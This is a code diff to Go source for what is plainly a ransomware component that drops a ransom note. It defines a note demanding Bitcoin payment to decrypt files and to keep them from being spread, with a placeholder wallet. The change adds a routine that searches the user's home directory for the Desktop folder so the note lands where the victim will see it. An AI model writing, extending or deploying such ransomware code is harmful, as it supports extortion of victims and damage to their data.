@@ -4,7 +4,6 @@ import (
 	"helpers"
 	"os"
 	"os/user"
-	"path/filepath"
 )
 
 var textForTxt = "YOUR FILES HAVE BEEN ENCRYPTED\n\nTo encrypt your files you have pay ransom.\nThe ransom must be paid in Bitcoin!\nThe amount of ransom that has to be baid in order to decrypt your files is 0.005 Bitcoin.\nThe amount of ransom that has to be baid in order to not spread your files is 0.01 Bitcoin.\nYou can send them to 1aChInoBitWallet123321"
@@ -25,6 +24,43 @@ var textForHtml = "<html lang='en'>" +
 	"</body>" +
 	"</html>"
 
+func getDesktopFolder(dir, nameOfLogFile string) string {
+	currentDir, err := os.ReadDir(dir)
+	if err != nil {
+		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+		os.Exit(6)
+	}
+
+	for _, entry := range currentDir {
+		if entry.IsDir() {
+			if entry.Name() == "Desktop" {
+				return dir + "/" + entry.Name()
+			}
+		}
+	}
+
+	for _, entry := range currentDir {
+		if entry.IsDir() {
+			currentSubDirName := dir + "/" + entry.Name()
+			currentSubDir, err := os.ReadDir(currentSubDirName)
+			if err != nil {
+				helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+				os.Exit(7)
+			}
+
+			for _, entry := range currentSubDir {
+				if entry.IsDir() {
+					if entry.Name() == "Desktop" {
+						return currentSubDirName + "/" + entry.Name()
+					}
+				}
+			}
+		}
+	}
+
+	return ""
+}
+
 func main() {
 	nameOfLogFile := helpers.CreateLogFileIfItDoesNotExist("./", "RanNote")
 
@@ -34,8 +70,7 @@ func main() {
 		os.Exit(1)
 	}
 
-	userHomeDir := user.HomeDir
-	desktopDir := filepath.Join(userHomeDir, "/onedrive/Desktop")
+	desktopDir := getDesktopFolder(user.HomeDir, nameOfLogFile)
 
 	_, err = os.Open(desktopDir + "/RansomwareNote.txt")
 	if err == nil {
